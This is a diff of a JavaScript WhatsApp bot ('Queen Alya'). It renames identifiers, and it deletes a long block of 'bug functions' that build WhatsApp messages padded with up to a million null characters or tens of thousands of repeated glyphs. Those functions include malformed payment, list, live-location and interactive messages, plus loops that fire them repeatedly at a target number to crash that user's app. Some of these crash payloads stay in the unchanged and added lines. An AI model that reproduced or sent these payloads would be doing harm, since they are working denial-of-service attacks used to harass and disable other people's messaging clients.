@@ -94,7 +94,7 @@ const {
     GIFBufferToVideoBuffer,
     totalcase
 } = require('./lib/myfunc')
-const { xeon_antispam } = require('./lib/antispam')
+const { alya_antispam } = require('./lib/antispam')
 //prem owner function
 const {
     addPremiumUser,
@@ -124,13 +124,13 @@ let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
 let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
 const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
 //media
-const VoiceNoteXeon = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyavn.json'))
+const VoiceNoteAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyavn.json'))
 const StickerAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyasticker.json'))
 const ImageAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyaimage.json'))
 const VideoAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyavideo.json'))
 const DocAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/doc.json'))
-const ZipXeon = JSON.parse(fs.readFileSync('./AlyaMedia/database/zip.json'))
-const ApkXeon = JSON.parse(fs.readFileSync('./AlyaMedia/database/apk.json'))
+const ZipAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/zip.json'))
+const ApkAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/apk.json'))
 
 //bug database
 const { alyatext1 } = require('./src/data/function/ABug/alyatext1')
@@ -145,7 +145,7 @@ const xsteek = fs.readFileSync(`./src/data/function/ABug/x.webp`)
 //store database
 const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))
 
-const xeonverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))
+const alyachoosen = JSON.parse(fs.readFileSync('./src/data/role/user.json'))
 
 global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
 if (global.db.data) global.db.data = {
@@ -161,7 +161,7 @@ settings: {},
 
 let vote = db.data.others.vote = []
 let kuismath = db.data.game.math = []
-
+const king = ('https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09')
 //time
 const xtime = moment.tz('Africa/Nigeria').format('HH:mm:ss')
 const xdate = moment.tz('Africa/Nigeria').format('DD/MM/YYYY')
@@ -276,7 +276,7 @@ module.exports = AlyaBotInc = async (AlyaBotInc, m, msg, chatUpdate, store) => {
         //anti media
         const isAlyaMedia = m.mtype
         //user status
-        const isUser = xeonverifieduser.includes(sender)
+        const isUser = alyachoosen.includes(sender)
         const AlyaTheQueen = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isPremium= AlyaTheQueen || checkPremiumUser(m.sender, premium)
         expiredPremiumCheck(AlyaBotInc, m, premium)
@@ -308,777 +308,7 @@ module.exports = AlyaBotInc = async (AlyaBotInc, m, msg, chatUpdate, store) => {
         }
  
 //==========={bug functions}==============\\
-const sendReaction = async reactionContent => {
-                AlyaBotInc.sendMessage(m.chat, {
-                    react: {
-                        text: reactionContent,
-                        key: m.key
-                    }
-                });
-            };
-
-            async function sendRepeatedMessages(jid, count) {
-                for (let i = 0; i < count; i++) {
-                    AlyaBotInc.sendMessage(
-                        recipientJid,
-                        {
-                            text: "".repeat(50000)
-                        },
-                        {
-                            participant: {
-                                jid: jid
-                            },
-                            messageId: etc.key.id
-                        },
-                        {
-                            quoted: m
-                        }
-                    );
-                }
-            }
-
-            const zyd = {
-                key: {
-                    participant: "0@s.whatsapp.net",
-                    ...(typeof m !== "undefined" && m.chat
-                        ? {
-                            remoteJid: "status@broadcast"
-                        }: {})
-                },
-                message: {
-                    listResponseMessage: {
-                        title: "👑QUEEN ALYA👑"
-                    }
-                }
-            };
-            async function stickerBug(jid) {
-                const _0x3edf68 = {
-                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
-                    fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
-                    fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
-                    mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
-                    mimetype: "image/webp",
-                    directPath:
-                    "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
-                    fileLength: "10116",
-                    mediaKeyTimestamp: "1715876003",
-                    isAnimated: false,
-                    stickerSentTs: "1715881084144",
-                    isAvatar: false,
-                    isAiSticker: false,
-                    isLottie: false
-                };
-                const _0x5d903d = {
-                    stickerMessage: _0x3edf68
-                };
-                var messageContent = generateWAMessageFromContent(
-                    jid,
-                    proto.Message.fromObject(_0x5d903d),
-                    {
-                        userJid: jid,
-                        quoted: zyd
-                    }
-                );
-                await AlyaBotInc.relayMessage(jid, messageContent.message, {
-                    participant: {
-                        jid: jid
-                    },
-                    messageId: messageContent.key.id
-                });
-            }
-
-            async function ButtonWithImageBug(jid) {
-                const upload = {
-                    upload: AlyaBotInc.waUploadToServer
-                };
-                const text = {
-                    text: ""
-                };
-                var messageContent = generateWAMessageFromContent(
-                    jid,
-                    proto.Message.fromObject({
-                        interactiveMessage: {
-                            header: {
-                                title: "👑QUEEN ALYA👑",
-                                hasMediaAttachment: true,
-                                ...(await prepareWAMessageMedia(
-                                    {
-                                        image: {
-                                            url: "https://i.imgur.com/QfDM014.jpeg"
-                                        }
-                                    },
-                                    upload
-                                ))
-                            },
-                            body: text,
-                            footer: {
-                                text: "›          #👑QUEEN ALYA👑"
-                            },
-                            nativeFlowMessage: {
-                                messageParamsJson: "\0".repeat(1000000)
-                            }
-                        }
-                    }),
-                    {
-                        userJid: jid,
-                        quoted: zyd
-                    }
-                );
-                await AlyaBotInc.relayMessage(jid, messageContent.message, {
-                    participant: {
-                        jid: jid
-                    },
-                    messageId: messageContent.key.id
-                });
-            }
-
-            async function LocationBug(jid) {
-                var messageContent = generateWAMessageFromContent(
-                    jid,
-                    proto.Message.fromObject({
-                        viewOnceMessage: {
-                            message: {
-                                liveLocationMessage: {
-                                    degreesLatitude: "p",
-                                    degreesLongitude: "p",
-                                    caption:
-                                    "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑" +
-                                    "ꦾ".repeat(50000),
-                                    sequenceNumber: "0",
-                                    jpegThumbnail: ""
-                                }
-                            }
-                        }
-                    }),
-                    {
-                        userJid: jid,
-                        quoted: zyd
-                    }
-                );
-                await AlyaBotInc.relayMessage(jid, messageContent.message, {
-                    participant: {
-                        jid: jid
-                    },
-                    messageId: messageContent.key.id
-                });
-            }
-            async function BugPayments(jid) {
-                const h = {
-                    product_header_info_id: 0x4433e2e130,
-                    product_header_is_rejected: false
-                };
-                var messageContent = generateWAMessageFromContent(
-                    jid,
-                    proto.Message.fromObject({
-                        listMessage: {
-                            title: "👑QUEEN ALYA👑" + "\0".repeat(920000),
-                            footerText:
-                            "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑",
-                            description:
-                            "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑",
-                            buttonText: null,
-                            listType: 0x2,
-                            productListInfo: {
-                                productSections: [{
-                                    title: "balya",
-                                    products: [{
-                                        productId: "4392524570816732"
-                                    }]
-                                }],
-                                productListHeaderImage: {
-                                    productId: "4392524570816732",
-                                    jpegThumbnail: null
-                                },
-                                businessOwnerJid: "0@s.whatsapp.net"
-                            }
-                        },
-                        footer: "puki",
-                        contextInfo: {
-                            expiration: 0x93a80,
-                            ephemeralSettingTimestamp: "1679959486",
-                            entryPointConversionSource: "global_search_new_chat",
-                            entryPointConversionApp: "whatsapp",
-                            entryPointConversionDelaySeconds: 0x9,
-                            disappearingMode: {
-                                initiator: "INITIATED_BY_ME"
-                            }
-                        },
-                        selectListType: 0x2,
-                        product_header_info: h
-                    }),
-                    {
-                        userJid: jid,
-                        quoted: zyd
-                    }
-                );
-                await AlyaBotInc.relayMessage(jid, messageContent.message, {
-                    participant: {
-                        jid: jid
-                    },
-                    messageId: messageContent.key.id
-                });
-            }
-
-            async function sendViewOnceMessages(jid, count) {
-                for (let i = 0; i < count; i++) {
-                    let messageContent = generateWAMessageFromContent(
-                        jid,
-                        {
-                            viewOnceMessage: {
-                                message: {
-                                    messageContextInfo: {
-                                        deviceListMetadata: {},
-                                        deviceListMetadataVersion: 2
-                                    },
-                                    interactiveMessage:
-                                    proto.Message.InteractiveMessage.create({
-                                        body: proto.Message.InteractiveMessage.Body.create(
-                                            {
-                                                text: ""
-                                            }
-                                        ),
-                                        footer: proto.Message.InteractiveMessage.Footer.create(
-                                            {
-                                                text: ""
-                                            }
-                                        ),
-                                        header: proto.Message.InteractiveMessage.Header.create(
-                                            {
-                                                title: "",
-                                                subtitle: "",
-                                                hasMediaAttachment: false
-                                            }
-                                        ),
-                                        nativeFlowMessage:
-                                        proto.Message.InteractiveMessage.NativeFlowMessage.create(
-                                            {
-                                                buttons: [{
-                                                    name: "cta_url",
-                                                    buttonParamsJson:
-                                                    '{"display_text":"à¾§".repeat(50000),"url":"https://www.google.com","merchant_url":"https://www.google.com"}'
-                                                }],
-                                                messageParamsJson:
-                                                "\0".repeat(100000)
-                                            }
-                                        )
-                                    })
-                                }
-                            }
-                        },
-                        {}
-                    );
-                    AlyaBotInc.relayMessage(jid, messageContent.message, {
-                        messageId: messageContent.key.id
-                    });
-                }
-            }
-            async function OneShot(jid) {
-                for (let jmlh = "3"; jmlh !== 0; jmlh -= 1) {
-                    await AlyaBotInc.relayMessage(
-                        jid,
-                        {
-                            viewOnceMessage: {
-                                message: {
-                                    messageContextInfo: {
-                                        deviceListMetadataVersion: 0x2,
-                                        deviceListMetadata: {}
-                                    },
-                                    interactiveMessage: {
-                                        nativeFlowMessage: {
-                                            buttons: [{
-                                                name: "payment_info",
-                                                buttonParamsJson:
-                                                '{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"👑드림 가이 ALYA","key":"+916909137213","key_type":"X"}}]}'
-                                            }]
-                                        }
-                                    }
-                                }
-                            }
-                        },
-                        {
-                            participant: {
-                                jid: jid
-                            }
-                        },
-                        {
-                            messageId: null
-                        }
-                    );
-                }
-                for (let jmlhh = "3"; jmlhh !== 0; jmlhh -= 1) {
-                    await AlyaBotInc.relayMessage(
-                        jid,
-                        {
-                            viewOnceMessage: {
-                                message: {
-                                    interactiveMessage: {
-                                        header: {
-                                            title: "",
-                                            subtitle: " "
-                                        },
-                                        body: {
-                                            text: "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑"
-                                        },
-                                        footer: {
-                                            text: "xp"
-                                        },
-                                        nativeFlowMessage: {
-                                            buttons: [{
-                                                name: "cta_url",
-                                                buttonParamsJson:
-                                                "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
-                                            }],
-                                            messageParamsJson: "\0".repeat(1000000)
-                                        }
-                                    }
-                                }
-                            }
-                        },
-                        {
-                            participant: {
-                                jid: jid
-                            }
-                        }
-                    );
-                }
-            }
-            async function sendPaymentInfoMessage(jid) {
-                await AlyaBotInc.relayMessage(
-                    jid,
-                    {
-                        viewOnceMessage: {
-                            message: {
-                                messageContextInfo: {
-                                    deviceListMetadataVersion: 0x2,
-                                    deviceListMetadata: {}
-                                },
-                                interactiveMessage: {
-                                    nativeFlowMessage: {
-                                        buttons: [{
-                                            name: "payment_info",
-                                            buttonParamsJson: JSON.stringify({
-                                                currency: "BRL",
-                                                total_amount: {
-                                                    value: 0,
-                                                    offset: 100
-                                                },
-                                                reference_id: "4P46GMY57GC",
-                                                type: "physical-goods",
-                                                order: {
-                                                    status: "pending",
-                                                    subtotal: {
-                                                        value: 0,
-                                                        offset: 100
-                                                    },
-                                                    order_type: "ORDER",
-                                                    items: [{
-                                                        name: "",
-                                                        amount: {
-                                                            value: 0,
-                                                            offset: 100
-                                                        },
-                                                        quantity: 0,
-                                                        sale_amount: {
-                                                            value: 0,
-                                                            offset: 100
-                                                        }
-                                                    }]
-                                                },
-                                                payment_settings: [{
-                                                    type: "pix_static_code",
-                                                    pix_static_code: {
-                                                        merchant_name:
-                                                        "meu ovo",
-                                                        key: "+5533998586057",
-                                                        key_type: "X"
-                                                    }
-                                                }]
-                                            })
-                                        }]
-                                    }
-                                }
-                            }
-                        }
-                    },
-                    {
-                        participant: {
-                            jid: jid
-                        }
-                    },
-                    {
-                        messageId: null
-                    }
-                );
-            }
-
-            async function sendSystemCrashMessage(jid) {
-                var messageContent = generateWAMessageFromContent(
-                    jid,
-                    proto.Message.fromObject({
-                        viewOnceMessage: {
-                            message: {
-                                interactiveMessage: {
-                                    header: {
-                                        title: "",
-                                        subtitle: " "
-                                    },
-                                    body: {
-                                        text: "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
-                                    },
-                                    footer: {
-                                        text: "xp"
-                                    },
-                                    nativeFlowMessage: {
-                                        buttons: [{
-                                            name: "cta_url",
-                                            buttonParamsJson:
-                                            "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
-                                        }],
-                                        messageParamsJson: "\0".repeat(1000000)
-                                    }
-                                }
-                            }
-                        }
-                    }),
-                    {
-                        userJid: jid
-                    }
-                );
-                await AlyaBotInc.relayMessage(jid, messageContent.message, {
-                    participant: {
-                        jid: jid
-                    },
-                    messageId: messageContent.key.id
-                });
-            }
-            async function sendListMessage(jid) {
-                var messageContent = generateWAMessageFromContent(
-                    jid,
-                    proto.Message.fromObject({
-                        listMessage: {
-                            title:
-                            "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" +
-                            "\0".repeat(920000),
-                            footerText:
-                            "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
-                            description:
-                            "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
-                            buttonText: null,
-                            listType: 2,
-                            productListInfo: {
-                                productSections: [{
-                                    title: "lol",
-                                    products: [{
-                                        productId: "4392524570816732"
-                                    }]
-                                }],
-                                productListHeaderImage: {
-                                    productId: "4392524570816732",
-                                    jpegThumbnail: null
-                                },
-                                businessOwnerJid: "0@s.whatsapp.net"
-                            }
-                        },
-                        footer: "lol",
-                        contextInfo: {
-                            expiration: 600000,
-                            ephemeralSettingTimestamp: "1679959486",
-                            entryPointConversionSource: "global_search_new_chat",
-                            entryPointConversionApp: "whatsapp",
-                            entryPointConversionDelaySeconds: 9,
-                            disappearingMode: {
-                                initiator: "INITIATED_BY_ME"
-                            }
-                        },
-                        selectListType: 2,
-                        product_header_info: {
-                            product_header_info_id: 292928282928,
-                            product_header_is_rejected: false
-                        }
-                    }),
-                    {
-                        userJid: jid
-                    }
-                );
-
-                await AlyaBotInc.relayMessage(jid, messageContent.message, {
-                    participant: {
-                        jid: jid
-                    },
-                    messageId: messageContent.key.id
-                });
-            }
-
-            async function sendLiveLocationMessage(jid) {
-                var messageContent = generateWAMessageFromContent(
-                    jid,
-                    proto.Message.fromObject({
-                        viewOnceMessage: {
-                            message: {
-                                liveLocationMessage: {
-                                    degreesLatitude: "p",
-                                    degreesLongitude: "p",
-                                    caption:
-                                    "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" +
-                                    "ê¦¾".repeat(50000),
-                                    sequenceNumber: "0",
-                                    jpegThumbnail: ""
-                                }
-                            }
-                        }
-                    }),
-                    {
-                        userJid: jid
-                    }
-                );
-
-                await AlyaBotInc.relayMessage(jid, messageContent.message, {
-                    participant: {
-                        jid: jid
-                    },
-                    messageId: messageContent.key.id
-                });
-            }
-
-            async function sendExtendedTextMessage(jid) {
-                AlyaBotInc.relayMessage(
-                    jid,
-                    {
-                        extendedTextMessage: {
-                            text: ".",
-                            contextInfo: {
-                                stanzaId: jid,
-                                participant: jid,
-                                quotedMessage: {
-                                    conversation:
-                                    "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(50000)
-                                },
-                                disappearingMode: {
-                                    initiator: "CHANGED_IN_CHAT",
-                                    trigger: "CHAT_SETTING"
-                                }
-                            },
-                            inviteLinkGroupTypeV2: "DEFAULT"
-                        }
-                    },
-                    {
-                        participant: {
-                            jid: jid
-                        }
-                    },
-                    {
-                        messageId: null
-                    }
-                );
-            }
-            async function sendPaymentInvite(jid) {
-                AlyaBotInc.relayMessage(
-                    jid,
-                    {
-                        paymentInviteMessage: {
-                            serviceType: "UPI",
-                            expiryTimestamp: Date.now() + 86400000
-                        }
-                    },
-                    {
-                        participant: {
-                            jid: jid
-                        }
-                    }
-                );
-            }
-
-            async function sendMultiplePaymentInvites(jid, count) {
-                for (let i = 0; i < count; i++) {
-                    sendPaymentInvite(jid);
-                    sendExtendedTextMessage(jid);
-                    await sleep(500);
-                }
-            }
-
-            async function sendVariousMessages(jid, count) {
-                for (let i = 0; i < count; i++) {
-                    sendListMessage(jid);
-                    sendLiveLocationMessage(jid);
-                    sendSystemCrashMessage(jid);
-                    await sleep(500);
-                }
-            }
-
-            async function sendRepeatedMessages2(jid, count) {
-                for (let i = 0; i < count; i++) {
-                    sendSystemCrashMessage(jid);
-                    sendSystemCrashMessage(jid);
-                    sendSystemCrashMessage(jid);
-                    await sleep(500);
-                }
-            }
-
-            async function sendMixedMessages(jid, count) {
-                for (let i = 0; i < count; i++) {
-                    sendLiveLocationMessage(jid);
-                    sendListMessage(jid);
-                    await sleep(500);
-                }
-            }
-
-            function sendMessageWithMentions(text, mentions = [], quoted = false) {
-                if (quoted == null || quoted == undefined || quoted == false) {
-                    return AlyaBotInc.sendMessage(
-                        m.chat,
-                        {
-                            text: text,
-                            mentions: mentions
-                        },
-                        {
-                            quoted: m
-                        }
-                    );
-                } else {
-                    return AlyaBotInc.sendMessage(
-                        m.chat,
-                        {
-                            text: text,
-                            mentions: mentions
-                        },
-                        {
-                            quoted: m
-                        }
-                    );
-                }
-            }
-
-            const abug2 = {
-                key: {
-                    remoteJid: "status@broadcast",
-                    fromMe: false,
-                    participant: "0@s.whatsapp.net"
-                },
-                message: {
-                    listResponseMessage: {
-                        title: botname
-                    }
-                }
-            };
-
-            const fakeflow = {
-                key: {
-                    remoteJid: "status@broadcast",
-                    fromMe: false,
-                    participant: "0@s.whatsapp.net"
-                },
-                message: {
-                    interactiveMessage: {
-                        header: {
-                            hasMediaAttachment: true,
-                            jpegThumbnail: bimg
-                        },
-                        nativeFlowMessage: {
-                            buttons: [{
-                                name: "review_and_pay",
-                                buttonParamsJson: `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
-                            }]
-                        }
-                    }
-                }
-            };
-
-            const alyaimun = texto => {
-                AlyaBotInc.sendMessage(
-                    from,
-                    {
-                        text: texto, mentions: [sender]
-                    },
-                    {
-                        quoted: m
-                    }
-                ).catch(e => {
-                        return reply("Erro..");
-                    });
-            };
-
-            const subscribe_alya = {
-                key: {
-                    fromMe: false,
-                    participant: "0@s.whatsapp.net",
-                    remoteJid: "status@broadcast"
-                },
-                message: {
-                    listResponseMessage: {
-                        title: `ALYA IS YOUR QUEEN`
-                    }
-                }
-            };
-            async function AlyaCrashy(alya, chat) {
-                AlyaBotInc.sendMessage(
-                    chat,
-                    {
-                        document: {
-                            url: "./settings.js"
-                        },
-                        mimetype: `image/null`,
-                        fileName: `${alya}.${alyatext1}`,
-                        caption: `${alya + alyatext1}`
-                    },
-                    {
-                        quoted: subscribe_alya
-                    }
-                );
-            }
-const painbug = { 
-key: {
-participant: `0@s.whatsapp.net`,
-...(m.chat ? {
-remoteJid: "status@broadcast"
-} : {})
-},
-message: {
-listResponseMessage: {
-title: `𝐐𝐮𝐞𝐞𝐧𖤛𝐀𝐥𝐲𝐚`
-}
-}
-}
 const force = {
-key: {
-participant: `0@s.whatsapp.net`,
-...(m.chat ? {
-remoteJid: "status@broadcast"
-} : {})
-},
-'message': {
-"interactiveMessage": { 
-"header": {
-"hasMediaAttachment": true,
-"jpegThumbnail": balya
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"Rias Crash",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
-}
-]
-}
-}
-}
-}
-async function ngeloc(target, kuwoted) {
-var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-viewOnceMessage: {
-message: {
-  "liveLocationMessage": {
-    "degreesLatitude": "p",
-    "degreesLongitude": "p",
-    "caption": `𝐀𝐥𝐲𝐚 𝐗 𝐂𝐫𝐚𝐬𝐡`+"ꦾ".repeat(50000),
-    "sequenceNumber": "0",
-    "jpegThumbnail": ""
-     }
-  }
-}
-}), { userJid: target, quoted: kuwoted })
-await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
-}
-const Alyabug = {
 key: {
 participant: `0@s.whatsapp.net`,
 ...(m.chat ? {
@@ -1095,36 +325,9 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Pᴀɪɴᴢʏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
+"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"👑 KING 👑 KING 👑 KING\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
-}
-}
-}
-}
-
-const zpay = {
-key: {
-participant: `0@s.whatsapp.net`,
-...(m.chat ? {
-remoteJid: "status@broadcast"
-} : {})
-},
-message: {
-requestPaymentMessage: {
-currencyCodeIso4217: 'USD',
-amount1000: 999,
-requestFrom: '0@s.whatsapp.net',
-noteMessage: {
-extendedTextMessage: {
-text: `Msg ${m.body || m.mtype}`
-}
-},
-expiryTimestamp: 999999999,
-amount: {
-value: 91929291929,
-offset: 1000,
-currencyCode: 'INR'
 }
 }
 }
@@ -1147,47 +350,28 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍ CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
-_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
-𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
